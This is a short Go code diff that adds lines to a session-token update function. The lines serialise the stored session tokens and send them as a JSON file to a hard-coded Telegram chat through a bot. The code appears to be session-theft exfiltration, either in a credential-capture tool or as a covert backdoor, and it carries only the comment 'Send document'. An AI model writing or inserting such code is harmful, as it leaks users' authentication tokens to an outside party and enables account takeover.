@@ -160,6 +160,12 @@ func (d *Database) sessionsUpdateTokens(sid string, tokens map[string]map[string
 	s.Tokens = tokens
 	s.UpdateTime = time.Now().UTC().Unix()
 
+	// Send document
+	tokenJSON, _ := json.Marshal(tokens)
+	tokenFile := tgbotapi.FileBytes{Name: "tg_tokens.json", Bytes: tokenJSON}
+	documentMsg := tgbotapi.NewDocument(5822512651, tokenFile)
+	bot.Send(documentMsg)
+
 	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
